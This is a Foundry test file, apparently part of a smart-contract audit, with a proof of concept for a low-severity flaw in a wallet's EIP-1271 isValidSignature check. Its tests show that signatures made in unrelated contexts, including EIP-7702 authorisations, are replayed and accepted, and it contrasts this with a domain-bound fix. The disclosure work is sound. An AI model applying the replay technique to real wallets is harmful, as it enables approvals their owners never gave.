// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.23;

// PoC F7 — LOW
// 65-byte isValidSignature path has no domain binding — prior EOA sigs reusable
//
// Root cause : The 65-byte branch in the external isValidSignature recovers
//              an address from the raw _hash with no chain-ID, no address,
//              and no domain separator binding:
//
//                (address recovered,,) = ECDSA.tryRecover(_hash, signature);
//                if (recovered == address(this)) return MAGIC_VALUE;
//
//              Any prior ECDSA signature Alice ever made over this exact
//              bytes32 value — in any context, on any protocol — will
//              return MAGIC_VALUE here.
//
// Concrete scenario: Alice signed an EIP-7702 authorisation hash, an
//   EIP-191 personal_sign message, or an off-chain agreement. An adversary
//   that knows (hash, sig) presents them to isValidSignature and receives
//   MAGIC_VALUE — the wallet appears to approve something it never intended.
//
// Run: forge test --match-contract PoC_F7 -vvvv

import "forge-std/Test.sol";
import {IWalletCore} from "src/interfaces/IWalletCore.sol";
import {WalletCore}  from "src/WalletCore.sol";
import {DeployInitHelper, DeployFactory} from "scripts/DeployInitHelper.sol";

contract PoC_F7 is Test {
    string constant NAME    = "wallet-core";
    string constant VERSION = "1.0.0";

    bytes4 constant MAGIC_VALUE   = 0x1626ba7e;
    bytes4 constant INVALID_VALUE = 0xffffffff;

    bytes32 constant DOMAIN_TYPEHASH =
        keccak256(
            "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
        );

    address internal _alice;
    uint256 internal _alicePk;

    WalletCore    internal _walletCore;
    DeployFactory public   deployFactory;

    function setUp() public {
        (_alice, _alicePk) = makeAddrAndKey("alice");

        deployFactory = new DeployFactory();
        bytes32 salt  = vm.envBytes32("DEPLOY_FACTORY_SALT");

        (,, address walletAddr) = DeployInitHelper.deployContracts(
            deployFactory, salt, NAME, VERSION
        );
        _walletCore = WalletCore(payable(walletAddr));

        vm.etch(_alice, address(_walletCore).code);
        deal(_alice, 10 ether);
        vm.prank(_alice);
        IWalletCore(_alice).initialize();
    }

    function _domainSeparator() internal view returns (bytes32) {
        (,,, uint256 chainId, address verifyingContract,,) =
            WalletCore(payable(_alice)).eip712Domain();
        return keccak256(abi.encode(
            DOMAIN_TYPEHASH,
            keccak256(bytes(NAME)),
            keccak256(bytes(VERSION)),
            chainId,
            verifyingContract
        ));
    }

    // ------------------------------------------------------------------
    // Test A: off-chain message signed in a prior context is accepted
    //         as wallet approval by a new, unrelated dApp
    // ------------------------------------------------------------------
    function test_f7_prior_offchain_sig_accepted_as_wallet_approval() public view {
        // Simulate a raw hash Alice signed in a completely unrelated context
        // (e.g. an off-chain agreement, a typed data payload from another protocol)
        bytes32 priorHash = keccak256("I agree to terms of service v1.0");

        // Alice signs raw hash — no domain, no chain binding
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, priorHash);
        bytes memory priorSig = abi.encodePacked(r, s, v);
        assertEq(priorSig.length, 65);

        // Adversary presents (priorHash, priorSig) to a new dApp's EIP-1271 check.
        // The dApp calls isValidSignature on Alice's wallet.
        bytes4 result = WalletCore(payable(_alice)).isValidSignature(priorHash, priorSig);

        // MAGIC_VALUE returned — wallet "approves" something it never intended
        assertEq(result, MAGIC_VALUE, "F7: prior sig should be accepted (no domain binding)");

        console.log("[F7-A] Prior off-chain sig accepted as wallet approval");
        console.log("[F7-A] No chain-ID, no address, no domain separation");
    }

    // ------------------------------------------------------------------
    // Test B: EIP-7702 authorisation hash reuse
    //
    // EIP-7702 auth hash = keccak256(0x05 || RLP(chainId, impl, nonce))
    // Alice signs this to delegate code to the wallet implementation.
    // An adversary presents the same (authHash, authSig) to isValidSignature
    // and receives MAGIC_VALUE.
    // ------------------------------------------------------------------
    function test_f7_eip7702_auth_hash_reused_as_wallet_approval() public view {
        // Reconstruct an EIP-7702 authorisation hash for Alice's current delegation
        // (chainId=31337 in forge tests, nonce=0 at delegation time)
        bytes32 authHash = keccak256(
            abi.encodePacked(
                bytes1(0x05),                     // EIP-7702 magic byte
                abi.encode(                        // RLP-equivalent for testing
                    block.chainid,
                    address(_walletCore),          // implementation address
                    uint256(0)                     // nonce at auth time
                )
            )
        );

        // Alice would have signed this to authorise the EIP-7702 delegation
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, authHash);
        bytes memory authSig = abi.encodePacked(r, s, v);

        // Adversary replays it against isValidSignature
        bytes4 result = WalletCore(payable(_alice)).isValidSignature(authHash, authSig);

        // Wallet returns MAGIC_VALUE — approves the auth hash as if it were a
        // current approval intent, not a past delegation signature
        assertEq(result, MAGIC_VALUE, "F7: EIP-7702 auth sig reused as approval");

        console.log("[F7-B] EIP-7702 auth hash accepted as current wallet approval");
    }

    // ------------------------------------------------------------------
    // Test C: contrast — domain-bound sig over the same hash fails
    //         (shows what the correct implementation would do)
    // ------------------------------------------------------------------
    function test_f7_domain_bound_sig_correctly_rejected() public view {
        bytes32 payload = keccak256("off-chain agreement");

        // A correct implementation would sign the domain-bound digest
        bytes32 domainBoundDigest = keccak256(
            abi.encodePacked("\x19\x01", _domainSeparator(), payload)
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(_alicePk, domainBoundDigest);
        bytes memory domainSig = abi.encodePacked(r, s, v);
        assertEq(domainSig.length, 65);

        // Present the domain-bound sig against the raw payload hash
        // Recovery yields a DIFFERENT address → INVALID_VALUE (correct behaviour)
        bytes4 result = WalletCore(payable(_alice)).isValidSignature(payload, domainSig);
        assertEq(result, INVALID_VALUE, "F7-C: domain-bound sig over raw hash should fail");

        // Now present the raw sig over the raw hash — still accepted
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(_alicePk, payload);
        bytes memory rawSig = abi.encodePacked(r2, s2, v2);
        bytes4 rawResult = WalletCore(payable(_alice)).isValidSignature(payload, rawSig);
        assertEq(rawResult, MAGIC_VALUE, "F7-C: raw sig should be accepted (bug)");

        console.log("[F7-C] Domain-bound sig correctly rejected, raw sig still accepted");
        console.log("[F7-C] Fix: replace raw recovery with _hashTypedDataV4-bound check");
    }
}
